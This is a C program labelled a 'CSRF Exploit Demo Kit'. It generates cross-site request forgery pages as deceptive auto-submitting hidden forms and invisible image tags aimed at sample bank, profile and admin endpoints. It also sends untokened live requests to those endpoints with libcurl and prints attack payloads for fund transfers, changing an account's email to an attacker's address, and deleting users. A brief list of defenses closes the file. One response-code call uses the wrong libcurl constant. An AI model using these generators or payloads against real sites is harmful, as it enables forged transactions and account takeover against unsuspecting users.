#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define MAX_URL_LENGTH 2048
#define MAX_PARAMS_LENGTH 4096

typedef struct {
    char method[16];
    char url[MAX_URL_LENGTH];
    char params[MAX_PARAMS_LENGTH];
    int has_csrf_protection;
} endpoint_t;

typedef struct {
    endpoint_t* endpoints;
    int count;
    int capacity;
} endpoint_list_t;

void init_endpoint_list(endpoint_list_t* list) {
    list->capacity = 10;
    list->count = 0;
    list->endpoints = malloc(list->capacity * sizeof(endpoint_t));
}

void add_endpoint(endpoint_list_t* list, const char* method, const char* url, const char* params, int has_csrf) {
    if (list->count >= list->capacity) {
        list->capacity *= 2;
        list->endpoints = realloc(list->endpoints, list->capacity * sizeof(endpoint_t));
    }
    
    endpoint_t* endpoint = &list->endpoints[list->count++];
    strncpy(endpoint->method, method, sizeof(endpoint->method));
    strncpy(endpoint->url, url, sizeof(endpoint->url));
    strncpy(endpoint->params, params, sizeof(endpoint->params));
    endpoint->has_csrf_protection = has_csrf;
}

void generate_csrf_exploit(const endpoint_t* endpoint, const char* output_file) {
    printf("Generating CSRF exploit for: %s %s\n", endpoint->method, endpoint->url);
    
    FILE* file = fopen(output_file, "w");
    if (!file) {
        printf("Error creating file: %s\n", output_file);
        return;
    }
    
    if (strcmp(endpoint->method, "GET") == 0) {
        // Generate GET-based CSRF (image tag)
        fprintf(file, "<html>\n");
        fprintf(file, "<head><title>CSRF Exploit</title></head>\n");
        fprintf(file, "<body>\n");
        fprintf(file, "<h1>Check out this image!</h1>\n");
        fprintf(file, "<img src=\"%s?%s\" width=\"1\" height=\"1\">\n", endpoint->url, endpoint->params);
        fprintf(file, "<p>Image loading...</p>\n");
        fprintf(file, "</body>\n");
        fprintf(file, "</html>\n");
    } else {
        // Generate POST-based CSRF (auto-submitting form)
        fprintf(file, "<html>\n");
        fprintf(file, "<head><title>CSRF Exploit</title></head>\n");
        fprintf(file, "<body>\n");
        fprintf(file, "<h1>Please wait...</h1>\n");
        fprintf(file, "<form id=\"csrfForm\" action=\"%s\" method=\"POST\">\n", endpoint->url);
        
        // Parse and add parameters
        char* params_copy = strdup(endpoint->params);
        char* token = strtok(params_copy, "&");
        while (token != NULL) {
            char* equals = strchr(token, '=');
            if (equals) {
                *equals = '\0';
                char* name = token;
                char* value = equals + 1;
                fprintf(file, "  <input type=\"hidden\" name=\"%s\" value=\"%s\">\n", name, value);
            }
            token = strtok(NULL, "&");
        }
        free(params_copy);
        
        fprintf(file, "</form>\n");
        fprintf(file, "<script>document.getElementById('csrfForm').submit();</script>\n");
        fprintf(file, "</body>\n");
        fprintf(file, "</html>\n");
    }
    
    fclose(file);
    printf("Exploit saved to: %s\n", output_file);
}

void test_csrf_protection(const char* url, const char* method, const char* params) {
    printf("Testing CSRF protection for: %s %s\n", method, url);
    
    CURL* curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        // First, test without any CSRF tokens
        if (strcmp(method, "GET") == 0) {
            char full_url[MAX_URL_LENGTH];
            snprintf(full_url, sizeof(full_url), "%s?%s", url, params);
            curl_easy_setopt(curl, CURLOPT_URL, full_url);
        } else {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params);
        }
        
        // Don't follow redirects
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
        
        // Perform the request
        res = curl_easy_perform(curl);
        
        if (res != CURLE_OK) {
            printf("Request failed: %s\n", curl_easy_strerror(res));
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLOPT_RESPONSE_CODE, &response_code);
            
            printf("Response code: %ld\n", response_code);
            
            if (response_code == 200) {
                printf("WARNING: Request succeeded without CSRF protection!\n");
            } else if (response_code == 403 || response_code == 401) {
                printf("CSRF protection might be in place (got %ld)\n", response_code);
            }
        }
        
        curl_easy_cleanup(curl);
    }
    
    curl_global_cleanup();
}

void demonstrate_csrf_attack_vectors() {
    printf("\n=== CSRF ATTACK VECTORS ===\n");
    
    printf("\n1. Basic Form CSRF:\n");
    printf("   <form action=\"http://bank.com/transfer\" method=\"POST\">\n");
    printf("     <input type=\"hidden\" name=\"to\" value=\"attacker\">\n");
    printf("     <input type=\"hidden\" name=\"amount\" value=\"1000\">\n");
    printf("   </form>\n");
    printf("   <script>document.forms[0].submit();</script>\n");
    
    printf("\n2. Image-based GET CSRF:\n");
    printf("   <img src=\"http://bank.com/transfer?to=attacker&amount=1000\" width=\"0\" height=\"0\">\n");
    
    printf("\n3. JSON CSRF with Flash:\n");
    printf("   // Use Flash to send JSON with arbitrary Content-Type\n");
    
    printf("\n4. Chained CSRF Attack:\n");
    printf("   // First: Change email to attacker-controlled\n");
    printf("   // Second: Use password reset to compromised email\n");
    
    printf("\n5. CORS-exploited CSRF:\n");
    printf("   <script>\n");
    printf("   fetch('http://api.target.com/data', {\n");
    printf("     method: 'POST',\n");
    printf("     credentials: 'include',\n");
    printf("     body: JSON.stringify({action: 'delete'})\n");
    printf("   });\n");
    printf("   </script>\n");
}

void demonstrate_csrf_defenses() {
    printf("\n=== CSRF DEFENSE MECHANISMS ===\n");
    
    printf("\n1. CSRF Tokens:\n");
    printf("   - Synchronizer token pattern\n");
    printf("   - Encrypted token pattern\n");
    printf("   - Double submit cookie\n");
    
    printf("\n2. SameSite Cookies:\n");
    printf("   Set-Cookie: session=abc123; SameSite=Strict\n");
    printf("   Set-Cookie: session=abc123; SameSite=Lax\n");
    
    printf("\n3. Custom Headers:\n");
    printf("   X-Requested-With: XMLHttpRequest\n");
    printf("   X-CSRF-Token: token_here\n");
    
    printf("\n4. User Interaction Required:\n");
    printf("   - Re-authentication for sensitive actions\n");
    printf("   - CAPTCHA challenges\n");
    printf("   - Confirmation dialogs\n");
}

int main() {
    printf("CSRF Exploit Demo Kit - C Edition\n");
    printf("==================================\n");
    
    endpoint_list_t endpoints;
    init_endpoint_list(&endpoints);
    
    // Add sample vulnerable endpoints
    add_endpoint(&endpoints, "POST", "http://vulnerable-bank.com/transfer", 
                 "to=attacker&amount=1000&currency=USD", 0);
    add_endpoint(&endpoints, "POST", "http://social-app.com/profile/email", 
                 "new_email=hacker@evil.com", 0);
    add_endpoint(&endpoints, "GET", "http://admin-panel.com/users/delete", 
                 "user_id=123", 0);
    
    // Generate exploits for each endpoint
    for (int i = 0; i < endpoints.count; i++) {
        char filename[64];
        snprintf(filename, sizeof(filename), "csrf_exploit_%d.html", i + 1);
        generate_csrf_exploit(&endpoints.endpoints[i], filename);
        
        // Test CSRF protection
        test_csrf_protection(endpoints.endpoints[i].url, 
                           endpoints.endpoints[i].method,
                           endpoints.endpoints[i].params);
    }
    
    demonstrate_csrf_attack_vectors();
    demonstrate_csrf_defenses();
    
    free(endpoints.endpoints);
    
    return 0;
}
